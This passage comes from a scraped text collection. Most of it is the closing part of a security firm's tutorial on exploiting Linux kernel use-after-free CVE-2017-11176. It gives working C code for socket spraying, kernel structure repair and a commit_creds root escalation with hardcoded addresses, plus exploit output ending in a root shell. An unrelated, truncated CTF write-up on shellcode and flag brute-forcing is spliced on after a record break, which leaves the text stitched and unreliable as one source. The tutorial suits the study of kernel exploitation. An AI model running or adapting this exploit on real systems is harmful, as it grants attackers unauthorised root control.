g_target.pid); \/\/ the original\npid\n\/\/ walk the bucket list\nstruct hlist_node *cur;\nstruct hlist_node **pprev = &bucket->first;\nfor (cur = bucket->first; cur; pprev = &cur->next, cur = cur->next)\n{\n\/\/ is this our target ?\nif (cur == (struct hlist_node*)sk)\n{\n\/\/ fix the 'next' and 'pprev' field\nif (cur->next == (struct hlist_node*)KMALLOC_TARGET) \/\/ 'cmsg_len' value (\nreallocation)\ncur->next = NULL; \/\/ first scenario: was the last element in the list\ncur->pprev = pprev;\n\/\/ __hlist_del() operation (dangling pointers fix up)\n*(cur->pprev) = cur->next;\nif (cur->next)\ncur->next->pprev = pprev;\nhash->entries--; \/\/ make it clean\n\/\/ stop walking\nbreak;\n}\n}\n\/\/ release the lock\nnetlink_table_ungrab();\n}\nNote that the whole operation is made under lock with\nnetlink_table_grab() and netlink_table_ungrab(), just like the kernel\ndo! Otherwise, we might corrupt the kernel if another thread is\nmodifying it.\nIt wasn't that terrible after all :-)\nPsst! The above code only works if we have setup a \"guard\" element,\nso... let's do it!\nSetting Up the Guard\nAs stated above, we will do a spray-like technique in order to setup\nthe guard. The idea being to create a lot of netlink socket, autobind\nthem and then scan the hash table to \"select\" two sockets that we own\nwhich are potentially adjacent.\nFirst, let's create a create_netlink_candidate() function that creates\na socket and autobind it:\nstruct sock_pid\n{\nint sock_fd;\nuint32_t pid;\n};\n\/*\n* Creates a NETLINK_USERSOCK netlink socket, binds it and retrieves its pid.\n* Argument @sp must not be NULL.\n*\n* Returns 0 on success, -1 on error.\n*\/\nstatic int create_netlink_candidate(struct sock_pid *sp)\n{\nstruct sockaddr_nl addr = {\n.nl_family = AF_NETLINK,\n.nl_pad = 0,\n.nl_pid = 0, \/\/ zero to use netlink_autobind()\n.nl_groups = 0 \/\/ no groups\n};\nsize_t addr_len = sizeof(addr);\nif ((sp->sock_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) == -1)\n{\nperror(\"[-] socket\");\ngoto fail;\n}\nif (_bind(sp->sock_fd, (struct sockaddr*)&addr, sizeof(addr)) == -1)\n{\nperror(\"[-] bind\");\ngoto fail_close;\n}\nif (_getsockname(sp->sock_fd, &addr, &addr_len))\n{\nperror(\"[-] getsockname\");\ngoto fail_close;\n}\nsp->pid = addr.nl_pid;\nreturn 0;\nfail_close:\nclose(sp->sock_fd);\nfail:\nsp->sock_fd = -1;\nsp->pid = -1;\nreturn -1;\n}\nNext, we need to parse the \/proc\/net\/netlink file. In addition, the\nparse_proc_net_netlink() allocates a pids array that holds all netlink\nsocket pids (including the one we do not own):\n\/*\n* Parses @proto hash table from '\/proc\/net\/netlink' and allocates\/fills the\n* @pids array. The total numbers of pids matched is stored in @nb_pids.\n*\n* A typical output looks like:\n*\n*    $ cat \/proc\/net\/netlink\n*    sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks     Drops\n*    ffff88001eb47800 0   0      00000000 0        0        (null) 2        0\n*    ffff88001fa65800 6   0      00000000 0        0        (null) 2        0\n*\n* Every line is printed from netlink_seq_show():\n*\n*    seq_printf(seq, \"%p %-3d %-6d %08x %-8d %-8d %p %-8d %-8d\\n\"\n*\n* Returns 0 on success, -1 on error.\n*\/\nstatic int parse_proc_net_netlink(int **pids, size_t *nb_pids, uint32_t proto)\n{\nint proc_fd;\nchar buf[4096];\nint ret;\nchar *ptr;\nchar *eol_token;\nsize_t nb_bytes_read = 0;\nsize_t tot_pids = 1024;\n*pids = NULL;\n*nb_pids = 0;\nif ((*pids = calloc(tot_pids, sizeof(**pids))) == NULL)\n{\nperror(\"[-] not enough memory\");\ngoto fail;\n}\nmemset(buf, 0, sizeof(buf));\nif ((proc_fd = _open(\"\/proc\/net\/netlink\", O_RDONLY)) < 0)\n{\nperror(\"[-] open\");\ngoto fail;\n}\nread_next_block:\nif ((ret = _read(proc_fd, buf, sizeof(buf))) < 0)\n{\nperror(\"[-] read\");\ngoto fail_close;\n}\nelse if (ret == 0) \/\/ no more line to read\n{\ngoto parsing_complete;\n}\nptr = buf;\nif (strstr(ptr, \"sk\") != NULL) \/\/ this is the first line\n{\nif ((eol_token = strstr(ptr, \"\\n\")) == NULL)\n{\n\/\/ XXX: we don't handle this case, we can't even read one line...\nprintf(\"[-] can't find end of first line\\n\");\ngoto fail_close;\n}\nnb_bytes_read += eol_token - ptr + 1;\nptr = eol_token + 1; \/\/ skip the first line\n}\nparse_next_line:\n\/\/ this is a \"normal\" line\nif ((eol_token = strstr(ptr, \"\\n\")) == NULL) \/\/ current line is incomplete\n{\nif (_lseek(proc_fd, nb_bytes_read, SEEK_SET) == -1)\n{\nperror(\"[-] lseek\");\ngoto fail_close;\n}\ngoto read_next_block;\n}\nelse\n{\nvoid *cur_addr;\nint cur_proto;\nint cur_pid;\nsscanf(ptr, \"%p %d %d\", &cur_addr, &cur_proto, &cur_pid);\nif (cur_proto == proto)\n{\nif (*nb_pids >= tot_pids) \/\/ current array is not big enough, make it grow\n{\ntot_pids *= 2;\nif ((*pids = realloc(*pids, tot_pids * sizeof(int))) == NULL)\n{\nprintf(\"[-] not enough memory\\n\");\ngoto fail_close;\n}\n}\n*(*pids + *nb_pids) = cur_pid;\n*nb_pids = *nb_pids + 1;\n}\nnb_bytes_read += eol_token - ptr + 1;\nptr = eol_token + 1;\ngoto parse_next_line;\n}\nparsing_complete:\nclose(proc_fd);\nreturn 0;\nfail_close:\nclose(proc_fd);\nfail:\nif (*pids != NULL)\nfree(*pids);\n*nb_pids = 0;\nreturn -1;\n}\nFinally, plug these guys together with find_netlink_candidates() which\ndoes:\n1. create a lot of netlink sockets (spray)\n2. parse the \/proc\/net\/netlink file\n3. try to find two sockets that we own and are consecutive\n4. release all other netlink sockets (cf. next section)\n#define MAX_SOCK_PID_SPRAY 300\n\/*\n* Prepare multiple netlink sockets and search \"adjacent\" ones. Arguments\n* @target and @guard must not be NULL.\n*\n* Returns 0 on success, -1 on error.\n*\/\nstatic int find_netlink_candidates(struct sock_pid *target, struct sock_pid *gua\nrd)\n{\nstruct sock_pid candidates[MAX_SOCK_PID_SPRAY];\nint *pids = NULL;\nsize_t nb_pids;\nint i, j;\nint nb_owned;\nint ret = -1;\ntarget->sock_fd = -1;\nguard->sock_fd = -1;\n\/\/ allocate a bunch of netlink sockets\nfor (i = 0; i < MAX_SOCK_PID_SPRAY; ++i)\n{\nif (create_netlink_candidate(&candidates[i]))\n{\nprintf(\"[-] failed to create a new candidate\\n\");\ngoto release_candidates;\n}\n}\nprintf(\"[+] %d candidates created\\n\", MAX_SOCK_PID_SPRAY);\nif (parse_proc_net_netlink(&pids, &nb_pids, NETLINK_USERSOCK))\n{\nprintf(\"[-] failed to parse '\/proc\/net\/netlink'\\n\");\ngoto release_pids;\n}\nprintf(\"[+] parsing '\/proc\/net\/netlink' complete\\n\");\n\/\/ find two consecutives pid that we own (slow algorithm O(N*M))\ni = nb_pids;\nwhile (--i > 0)\n{\nguard->pid = pids[i];\ntarget->pid = pids[i - 1];\nnb_owned = 0;\n\/\/ the list is not ordered by pid, so we do a full walking\nfor (j = 0; j < MAX_SOCK_PID_SPRAY; ++j)\n{\nif (candidates[j].pid == guard->pid)\n{\nguard->sock_fd = candidates[j].sock_fd;\nnb_owned++;\n}\nelse if (candidates[j].pid == target->pid)\n{\ntarget->sock_fd = candidates[j].sock_fd;\nnb_owned++;\n}\nif (nb_owned == 2)\ngoto found;\n}\n\/\/ reset sock_fd to release them\nguard->sock_fd = -1;\ntarget->sock_fd = -1;\n}\n\/\/ we didn't found any valid candidates, release and quit\ngoto release_pids;\nfound:\nprintf(\"[+] adjacent candidates found!\\n\");\nret = 0; \/\/ we succeed\nrelease_pids:\ni = MAX_SOCK_PID_SPRAY; \/\/ reset the candidate counter for release\nif (pids != NULL)\nfree(pids);\nrelease_candidates:\nwhile (--i >= 0)\n{\n\/\/ do not release the target\/guard sockets\nif ((candidates[i].sock_fd != target->sock_fd) &&\n(candidates[i].sock_fd != guard->sock_fd))\n{\nclose(candidates[i].sock_fd);\n}\n}\nreturn ret;\n}\nBecause of the new create_netlink_candidate() function, we won't use\nthe previous prepare_blocking_socket() function anymore. However, we\nstill need to make our target block by filling its receive buffer. In\naddition, we will use the \"guard\" to fill it. This is implemented in\nfill_receive_buffer():\nstatic int fill_receive_buffer(struct sock_pid *target, struct sock_pid *guard)\n{\nchar buf[1024*10];\nint new_size = 0; \/\/ this will be reset to SOCK_MIN_RCVBUF\nstruct sockaddr_nl addr = {\n.nl_family = AF_NETLINK,\n.nl_pad = 0,\n.nl_pid = target->pid, \/\/ use the target's pid\n.nl_groups = 0 \/\/ no groups\n};\nstruct iovec iov = {\n.iov_base = buf,\n.iov_len = sizeof(buf)\n};\nstruct msghdr mhdr = {\n.msg_name = &addr,\n.msg_namelen = sizeof(addr),\n.msg_iov = &iov,\n.msg_iovlen = 1,\n.msg_control = NULL,\n.msg_controllen = 0,\n.msg_flags = 0,\n};\nprintf(\"[ ] preparing blocking netlink socket\\n\");\nif (_setsockopt(target->sock_fd, SOL_SOCKET, SO_RCVBUF, &new_size, sizeof(new_\nsize)))\nperror(\"[-] setsockopt\"); \/\/ no worry if it fails, it is just an optim.\nelse\nprintf(\"[+] receive buffer reduced\\n\");\nprintf(\"[ ] flooding socket\\n\");\nwhile (_sendmsg(guard->sock_fd, &mhdr, MSG_DONTWAIT) > 0)\n;\nif (errno != EAGAIN)\n{\nperror(\"[-] sendmsg\");\ngoto fail;\n}\nprintf(\"[+] flood completed\\n\");\nprintf(\"[+] blocking socket ready\\n\");\nreturn 0;\nfail:\nprintf(\"[-] failed to prepare blocking socket\\n\");\nreturn -1;\n}\nLet's edit the main() function to call find_netlink_candidates() after\ninitializing the reallocation. Note that we do not use the sock_fd\nvariable anymore but the g_target.sock_fd. Both g_target and g_guard\nare declared globally, so we can use them in payload(). Also, remember\nto close the guard AFTER the reallocation to handle the \"scenario 1\"\n(guard is adjacent to target):\nstatic struct sock_pid g_target;\nstatic struct sock_pid g_guard;\nint main(void)\n{\n\/\/ ... cut ...\nprintf(\"[+] reallocation ready!\\n\");\nif (find_netlink_candidates(&g_target, &g_guard))\n{\nprintf(\"[-] failed to find netlink candidates\\n\");\ngoto fail;\n}\nprintf(\"[+] netlink candidates ready:\\n\");\nprintf(\"[+] target.pid = %d\\n\", g_target.pid);\nprintf(\"[+] guard.pid  = %d\\n\", g_guard.pid);\nif (fill_receive_buffer(&g_target, &g_guard))\ngoto fail;\nif (((unblock_fd = _dup(g_target.sock_fd)) < 0) ||\n((sock_fd2 = _dup(g_target.sock_fd)) < 0))\n{\nperror(\"[-] dup\");\ngoto fail;\n}\nprintf(\"[+] netlink fd duplicated (unblock_fd=%d, sock_fd2=%d)\\n\", unblock_fd,\nsock_fd2);\n\/\/ trigger the bug twice AND immediatly realloc!\nif (decrease_sock_refcounter(g_target.sock_fd, unblock_fd) ||\ndecrease_sock_refcounter(sock_fd2, unblock_fd))\n{\ngoto fail;\n}\nrealloc_NOW();\n\/\/ close it before invoking the arbitrary call\nprintf(\"[ ] closing guard socket\\n\");\nclose(g_guard.sock_fd);                       \/\/ <----- !\n\/\/ ... cut ...\n}\nNice, it is time for a crash test!\n$ .\/exploit\n[ ] -={ CVE-2017-11176 Exploit }=-\n[+] successfully migrated to CPU#0\n[+] userland structures allocated:\n[+] g_uland_wq_elt = 0x120001000\n[+] g_fake_stack   = 0x20001000\n[+] ROP-chain ready\n[ ] optmem_max = 20480\n[+] can use the 'ancillary data buffer' reallocation gadget!\n[+] g_uland_wq_elt.func = 0xffffffff8107b6b8\n[+] reallocation data initialized!\n[ ] initializing reallocation threads, please wait...\n[+] 200 reallocation threads ready!\n[+] reallocation ready!\n[+] 300 candidates created\n[+] parsing '\/proc\/net\/netlink' complete\n[+] adjacent candidates found!\n[+] netlink candidates ready:\n[+] target.pid = -5723\n[+] guard.pid  = -5708\n[ ] preparing blocking netlink socket\n[+] receive buffer reduced\n[ ] flooding socket\n[+] flood completed\n[+] blocking socket ready\n[+] netlink fd duplicated (unblock_fd=403, sock_fd2=404)\n[ ] creating unblock thread...\n[+] unblocking thread has been created!\n[ ] get ready to block\n[ ][unblock] closing 468 fd\n[ ][unblock] unblocking now\n[+] mq_notify succeed\n[ ] creating unblock thread...\n[+] unblocking thread has been created!\n[ ] get ready to block\n[ ][unblock] closing 404 fd\n[ ][unblock] unblocking now\n[+] mq_notify succeed\n[ ] closing guard socket\n[ ] addr_len = 12\n[ ] addr.nl_pid = 296082670\n[ ] magic_pid = 296082670\n[+] reallocation succeed! Have fun :-)\n[ ] invoking arbitrary call primitive...\n[+] arbitrary call succeed!\n[+] exploit complete!\n$ cat \/proc\/net\/netlink\nsk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks     Drops\nffff88001eb47800 0   0      00000000 0        0        (null) 2        0\nffff88001fa66800 6   0      00000000 0        0        (null) 2        0\nffff88001966ac00 9   1125   00000000 0        0        (null) 2        0\nffff88001a2a0800 9   0      00000000 0        0        (null) 2        0\nffff88001e24f400 10  0      00000000 0        0        (null) 2        0\nffff88001e0a2c00 11  0      00000000 0        0        (null) 2        0\nffff88001f492c00 15  480    00000000 0        0        (null) 2        0\nffff88001f492400 15  479    00000001 0        0        (null) 2        0\nffff88001f58f800 15  -4154  00000000 0        0        (null) 2        0\nffff88001eb47000 15  0      00000000 0        0        (null) 2        0\nffff88001e0fe000 16  0      00000000 0        0        (null) 2        0\nffff88001e0fe400 18  0      00000000 0        0        (null) 2        0\nffff8800196bf800 31  1322   00000001 0        0        (null) 2        0\nffff880019698000 31  0      00000000 0        0        (null) 2        0\nEUREKA!\nNO MORE CRASH!\nTHE KERNEL IS REPAIRED!\nTHE EXPLOIT WAS SUCCESSFUL!\nWE ARE DONE!\nW00t! We can breathe now...\nHopefully, we repaired \"everything\" and didn't forget any dangling\npointer or other stuff. No one is perfect...\nSo, what's next? Before going into the \"profit\" stage of the exploit,\nwe would like to get back a bit to explain why we released the netlink\nsockets in find_netlink_candidates().\n__________________________________________________________________\nReliability\nAs mentioned in the previous section, we overlooked the fact that we\nspray and release the netlink candidates in find_netlink_candidates().\nThe reason why we do this is to improve the exploit reliability.\nLet's enumerate what can go wrong with this exploit (considering you\ndidn't mess up with hardcoded offsets\/addresses):\n* The reallocation fails\n* A concurrent binary (or the kernel itself) tries to walk our\ntarget's bucket list\nAs stated in [56]part 3, improving reallocation is a complex topic. You\nreally need to understand the memory subsystem in detail if you want to\nfind a way to get a better reallocation success rate. This is\nout-of-topic. What we did in part 3 is simply a \"heap spraying\" in\ncombination with CPU fixation. It will work \"most of the time\", but\nthere is room for improvement. Fortunately, our object lives in the\nkmalloc-1024, a not-so-used kmemcache.\nIn the \"Repair the Kernel\" section, we saw that our target's bucket\nlist can be walked in two cases:\n1. a netlink socket has a pid which collides with our target's bucket\n2. a dilution occurs, the kernel walk every bucket list\nIn both cases, until we repair the kernel, this will provoke a\nNULL-deref because we do not control the first field of our\nreallocation data (hence next is 1024, a non NULL value).\nTo minimize both the risk of a dilution and a collision we create (and\nautobind) a lot of netlink sockets. The more bucket there is, the less\nare the chances a collision happens. Hopefully, the Jenkins Hash\nfunction produces \"uniform\" values so we have something like \"1 \/\n(nb_buckets)\" probability that a collision occurs during an insertion.\nWith 256 buckets, we have a 0.4% probability that such collision\noccurs. This is \"acceptable\".\nNext, come the \"dilution\" issue. A dilution happens in two cases:\n1. The hash table grows\n2. Insertion into a \"charged\" bucket (i.e. collision)\nWe already deal with 2), see above.\nIn order to deal with 1), we preemptively make it grow by allocating a\nlot of netlink socket. And because the hash table is never shrinked by\nreleasing all those sockets (but our target\/guard) the table is mostly\nempty.\nThat is, we can only be screwed if another program is using\nNETLINK_USERSOCK intensively (it can use other netlink protocol freely)\nwith a lot of different sockets AND all of them are bound! How to\ncompute the probability? Well... you never know what other programs are\nrunning... It's part of the game!\nWe could play, with \"\/proc\/net\/netlink\" to check the utilization and\ndecide whether or not to run the exploit, do some statistics analysis,\netc.\nThe following diagram shows a \"danger\" map of things that can crash the\nkernel in the course of the exploit:\nExploit Danger Map danger_map.png\n__________________________________________________________________\nGetting root\nWhat we will do here is to get root.\nDepending on your motivations, you can do many more in ring-0 than in\nring-3 (escaping container\/vm\/trustzone, patching the kernel,\nextract\/scan memory\/secrets, etc...), but people like the mighty #...\n:-)\nSo, from our \"unprivileged\" user point-of-view this is a privilege\nescalation. However, considering we can now execute arbitrary code in\nring-0, going back to ring-3 is actually a privilege de-escalation.\nWhat defines the privilege of a task in Linux? The struct cred:\nstruct cred {\natomic_t    usage;\n\/\/ ... cut ...\nuid_t       uid;        \/* real UID of the task *\/\ngid_t       gid;        \/* real GID of the task *\/\nuid_t       suid;       \/* saved UID of the task *\/\ngid_t       sgid;       \/* saved GID of the task *\/\nuid_t       euid;       \/* effective UID of the task *\/\ngid_t       egid;       \/* effective GID of the task *\/\nuid_t       fsuid;      \/* UID for VFS ops *\/\ngid_t       fsgid;      \/* GID for VFS ops *\/\nunsigned    securebits; \/* SUID-less security management *\/\nkernel_cap_t    cap_inheritable; \/* caps our children can inherit *\/\nkernel_cap_t    cap_permitted;  \/* caps we're permitted *\/\nkernel_cap_t    cap_effective;  \/* caps we can actually use *\/\nkernel_cap_t    cap_bset;   \/* capability bounding set *\/\n\/\/ ... cut ...\n#ifdef CONFIG_SECURITY\nvoid        *security;  \/* subjective LSM security *\/\n#endif\n\/\/ ... cut ...\n};\nEach task (i.e. task_struct), has two struct creds:\nstruct task_struct {\n\/\/ ... cut ...\nconst struct cred *real_cred;   \/* objective and real subjective task creden\ntials (COW) *\/\nconst struct cred *cred;    \/* effective (overridable) subjective task\n\/\/ ... cut ...\n};\nYou might already be familiar with uid\/gid and euid\/egid. Surprisingly,\nwhat matters the most is actually capabilities! If you look at various\nsystem call (e.g. chroot()), most of them start with\n!capable(CAP_SYS_xxx) code:\nSYSCALL_DEFINE1(chroot, const char __user *, filename)\n{\n\/\/ ... cut ...\nerror = -EPERM;\nif (!capable(CAP_SYS_CHROOT))\ngoto dput_and_out;\n\/\/ ... cut ...\n}\nYou will rarely see (ever?) a code with (current->real_cred->uid == 0)\nin kernel code (unlike userland code). In other words, just \"writing\nzeroes\" into your own struct cred ids is not enough.\nIn addition, you will see a lot of functions starting with\nsecurity_xxx() prefixe. For instance:\nstatic inline int __sock_sendmsg(struct kiocb *iocb, struct socket *sock,\nstruct msghdr *msg, size_t size)\n{\nint err = security_socket_sendmsg(sock, msg, size);\nreturn err ?: __sock_sendmsg_nosec(iocb, sock, msg, size);\n}\nThis kind of function comes from Linux Security Modules (LSM) and uses\nthe security field of a struct cred. A well-known LSM is SELinux. The\nmain purpose of LSM is to enforce access rights.\nSo, there are: uids, capabilities, security, etc. What should we do?\nJust patch the whole struct cred? You can, but there is something\nbetter... Change the real_cred and cred pointers in our task_struct?\nGetting closer...\nThe problem with \"overwriting\" those pointers manually is: what value\nwill you overwrite with? Scan root's task and use those values? Nope!\nThe struct cred are refcounted! Without taking a reference, you just\nintroduced a double refcounter decrease (just like our bug ironically).\nThere is actually a function that does all of those refcounting\nhousekeeping for you:\nint commit_creds(struct cred *new)\n{\nstruct task_struct *task = current;\nconst struct cred *old = task->real_cred;\n\/\/ ... cut ...\nget_cred(new);      \/\/ <---- take a reference\n\/\/ ... cut ...\nrcu_assign_pointer(task->real_cred, new);\nrcu_assign_pointer(task->cred, new);\n\/\/ ... cut ...\n\/* release the old obj and subj refs both *\/\nput_cred(old);      \/\/ <----- release previous references\nput_cred(old);\nreturn 0;\n}\nNice, but it needs a valid struct cred in parameters. So, it is time to\nmeet his buddy: prepare_kernel_cred():\nstruct cred *prepare_kernel_cred(struct task_struct *daemon)\n{\nconst struct cred *old;\nstruct cred *new;\nnew = kmem_cache_alloc(cred_jar, GFP_KERNEL);\nif (!new)\nreturn NULL;\nif (daemon)\nold = get_task_cred(daemon);\nelse\nold = get_cred(&init_cred);     \/\/ <----- THIS!\nvalidate_creds(old);\n*new = *old;                      \/\/ <----- copy all fields\n\/\/ ... cut ...\n}\nBasically, what prepare_kernel_cred() does is: allocates a new struct\ncred and fills it from the current's one. However, if the parameter is\nNULL, it will copy the init process' cred, the most privilegied process\non the system (which also runs in \"root\")!\nYou get it, we only need to call this:\ncommit_cred(prepare_kernel_cred(NULL));\nThat's all! In addition, it will release our previous struct cred\ncleanly. Let's update the exploit:\n#define COMMIT_CREDS          ((void*) 0xffffffff810b8ee0)\n#define PREPARE_KERNEL_CRED   ((void*) 0xffffffff810b90c0)\ntypedef int (*commit_creds_func)(void *new);\ntypedef void* (*prepare_kernel_cred_func)(void *daemon);\n#define commit_creds(cred) \\\n(((commit_creds_func)(COMMIT_CREDS))(cred))\n#define prepare_kernel_cred(daemon) \\\n(((prepare_kernel_cred_func)(PREPARE_KERNEL_CRED))(daemon))\nstatic void payload(void)\n{\n\/\/ ... cut ...\n\/\/ release the lock\nnetlink_table_ungrab();\n\/\/ privilege (de-)escalation\ncommit_creds(prepare_kernel_cred(NULL));\n}\nAnd add the \"popping shell\" code:\nint main(void)\n{\n\/\/ ... cut ...\nprintf(\"[+] exploit complete!\\n\");\nprintf(\"[ ] popping shell now!\\n\");\nchar* shell = \"\/bin\/bash\";\nchar* args[] = {shell, \"-i\", NULL};\nexecve(shell, args, NULL);\nreturn 0;\nfail:\nprintf(\"[-] exploit failed!\\n\");\nPRESS_KEY();\nreturn -1;\n}\nWhich gives:\n[user@localhost tmp]$ id; .\/exploit\nuid=1000(user) gid=1000(user) groups=1000(user)\n[ ] -={ CVE-2017-11176 Exploit }=-\n[+] successfully migrated to CPU#0\n...\n[+] arbitrary call succeed!\n[+] exploit complete!\n[ ] popping shell now!\n[root@localhost tmp]# id\nuid=0(root) gid=0(root) groups=0(root)\nNow we are really done! Remember, you have ring-0 arbitrary code\nexecution this is \"more privileged\" than \"root\". Use it wisely, and\nhave fun :-)!\n__________________________________________________________________\nConclusion\nCongratulations, you made it!\nFirst, I would like to thank you for getting to that point. Writing\nyour first kernel exploit is a daunting task that discourages most\npeople. It requires to understand a lot of stuff at once, patience and\npugnacity.\nFurthermore, we kinda made it the \"hard way\" (no show off) by\nexploiting a use-after-free (a memory corruption bug). You might find\nshorter exploit that only have small amount of code (some have fewer\nthan 10 lines!). Those exploit \"logical bug\" which is considered by\nsome to be the best class of bug (targetless, reliable, fast, etc.).\nNevertheless, they can be very specific and might not expose as many\nsubsystems as we've seen here.\nUse-after-free are still pretty common at the time of writing (2018).\nThey can be more or less hard to detect by fuzzer or manual code\nreview. In particular, the bug we exploited here existed because of a\nsingle missing line. In addition, it is only triggered during a race\ncondition which makes it even harder to detect.\nDuring this series, we barely scratched the surface of the following\nLinux kernel subsystems (from makelinux.net):\nLinux Kernel Map kernel_map.jpg\nHopefully, you are now more familiar with the terms written there. As\nyou can see, this is still a long road... :-)\nAlright, let's sum up what we've done.\nIn [57]part 1, we introduced the basics of the \"virtual file system\"\n(what is a file? a FDT? VFT?) as well as the refcounting facility. By\nstudying public information (CVE description, patch) we got a better\nunderstanding of the bug and designed an attack scenario. Then, we\nimplemented it in kernel-land using SystemTap (a very handy tool!).\nIn [58]part 2, we introduced the \"scheduler subsystem\" and more\nspecifically the \"wait queues\". Understanding it allowed us to\nunconditionally win the race condition. By doing a meticulous analysis\nof several kernel code paths, we were able to tailor our syscalls and\nbuild the proof-of-concept with userland code. It provoked our first\nkernel crashes.\nIn [59]part 3, we introduced the \"memory subsystem\" and focus on the\nSLAB allocator, a must have to exploit most use-after-free and\/or heap\noverflow bugs. After analysing in deeper details all information\nrequired to exploit the UAF, we found a way to gain an arbitrary call\nprimitive by using type confusion and make the netlink socket's wait\nqueue pointing into userland. In addition, we implemented the\nreallocation using a well-known reallocation gadget: ancillary data\nbuffer.\nIn this final part, we saw a lot of \"low-level\" and\n\"architecture-dependent\" things relative to x86-64 (kernel stacks,\nvirtual memory layout, thread_info). In order to gain arbitrary code\nexecution we hit a hardware security feature: SMEP. Understanding the\nx86-64 access rights determination, as well as page fault exception\ntraces, we designed an exploitation strategy to bypass it (disable it\nwith ROP-chains).\nGaining the arbitrary execution was only part of the success as we\nstill needed to repair the kernel. While repairing the socket dangling\npointer was pretty straightforward, repairing the hash list brought\nseveral difficulties that we overcame by having a good understanding of\nthe netlink code (data structures, algorithms, procfs). In the end, we\ngot a root shell by calling only two kernel functions and analyzed the\nexploit weaknesses (reliability).\n__________________________________________________________________\nGoing Further\nWhat to do next?\nIf you want to improve this exploit, there are still plenty of stuff to\ndo. For instance, can you re-enable SMEP with ROP, and more\ninterestingly, without ROP (play with the PTEs, map executable code\ninto kernel land, etc.). You may want to add another reallocation\ngadget in your toolbox, have a look at msgsnd() and find a way to\ndrastically improve the reallocation success rate. A more challenging\nexercise could be to gain arbitrary code execution without using any\nROP (remember, you can change func and call it as many times as you\nwant).\nNow, consider there is SMAP on your target, can we still exploit the\nbug this way? If not, what to do? Maybe the arbitrary call primitive is\nnot the good one... Sooner or later you will understand that gaining\narbitrary read\/write is actually much better as it allows to bypass\nalmost any security protection.\nIf you want to move on, pick another CVE and try to do the same job\nthat we did here. Understand the bug, code the PoC, build the exploit.\nNever trust the CVE description that qualifies a bug as a DoS and\/or\nhave a \"low\/moderate\" criticity. Really, developing CVE exploits is a\ngood way to understand the Linux kernel as they will just not work if\nyou don't understand what is going on.\nAs a final note, I wish you a warm welcome into the kernel hacking\nworld. I hope you enjoyed this series, learned a lot and want to learn\neven more! Thanks for reading.\n\"Salut, et merci pour le poisson !\"\n[60]Tweet\n[61]Share\n[62]Share\n[63]Share\nLEXFO - Because information security is essential\nContact us\nAdresse\nOur address\n17 avenue Hoche\n75008 PARIS, FRANCE\nEmail\nBy email\ncontact [at] lexfo [dot] fr\nT\u00e9l\u00e9phone\nBy phone\n+33 1 40 17 91 28\n[64]@LexfoSecurite, Lexfo's twitter account\nOn Twitter\n[65]@LexfoSecurite\n[66]Back to the top\n\u00a9 LEXFO 2022 - All rights reserved"}
{"text":"# hxp 2017 CTF\n\n**sandb0x**\n\n- There's gcc compile available with user.s assembly code.\n- only 80byte length is allowed.\n- Remote Binary is blind, and PIE and ASLR are on.\n- No way to 2round Exploitation to get shell except for launching shellcode.\n- And prctl is used for seccomp filter.\n- user.s can overwrite prctl call with `.global prctl;prctl:~~~`\n- So, I write shellcode on some stack, and jmp to that address\n\n\n\n\n\n\n\n\n\n\n**dont_panic**\n\n- check argv[1] length\n\n```\n[----------------------------------registers-----------------------------------]\nRAX: 0x8\nRBX: 0x4fb090 --> 0x0\nRCX: 0x7fffffffe570 (\"AAAABBBB\")\nRDX: 0x4ab760 --> 0x47b8a0 (mov    rcx,QWORD PTR fs:0xfffffffffffffff8)\nRSI: 0x10\nRDI: 0x490e80 --> 0x10\nRBP: 0xc42003bf78 --> 0xc42003bfd0 --> 0x0\nRSP: 0xc42003be90 --> 0x0\nRIP: 0x47b90a (cmp    rax,0x2a)\nR8 : 0x208\nR9 : 0x0\nR10: 0xc420058170 --> 0x4a8976 (\"syntax error scanning booleantoo many open files in systemtraceback has leftover defers locals stack map entries for 227373675443232059478759765625MHeap_AllocLocked - bad npagesSIGPROF: profiling alar\"...)\nR11: 0xc420058170 --> 0x4a8976 (\"syntax error scanning booleantoo many open files in systemtraceback has leftover defers locals stack map entries for 227373675443232059478759765625MHeap_AllocLocked - bad npagesSIGPROF: profiling alar\"...)\nR12: 0x1\nR13: 0x18\nR14: 0x170\nR15: 0x200\nEFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x47b8fc:\tmov    QWORD PTR [rsp+0x50],rcx\n   0x47b901:\tmov    rax,QWORD PTR [rax+0x18]\n   0x47b905:\tmov    QWORD PTR [rsp+0x48],rax\n=> 0x47b90a:\tcmp    rax,0x2a\n   0x47b90e:\tjl     0x47ba23\n```\n\n- 0x47ba23 is fail routine. Feature of Fail.\n- Find Success Routine\n- make script for automation ( check fail or success ) -> Brute force\n- success statement is here\n```\nloc_47B998:\nlea     rax, unk_4A8374\nmov     [rsp+0F0h+var_48], rax\nmov     [rsp+0F0h+var_40], 1Ch\nmov     [rsp+0F0h+var_98], 0\nmov     [rsp+0F0h+var_90], 0\nlea     rax, unk_489D80\n```\n\n- `unk_4a8374` : -> `Seems like you got a flag...`\n- This is final Success routine.\n- So, check `rip` if success address or not.\n- result\n\n```\nroot@ubuntu:\/mnt\/hgfs\/shared\/hxp\/dont_panic# python solve.py\n[*] '\/mnt\/hgfs\/shared\/hxp\/dont_panic\/main_strip'\n    Arch:     amd64-64-little\n    RELRO:    No RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n[+] Starting local process '\/usr\/bin\/gdb': pid 4985\nfind hAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nfind hxAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nfind hxpAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nfind hxp{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nfind hxp{kAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nfind hxp{k3AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nfind hxp{k3eAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nfind hxp{k3ePAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nfind hxp{k3eP_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nfind hxp{k3eP_CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nfind 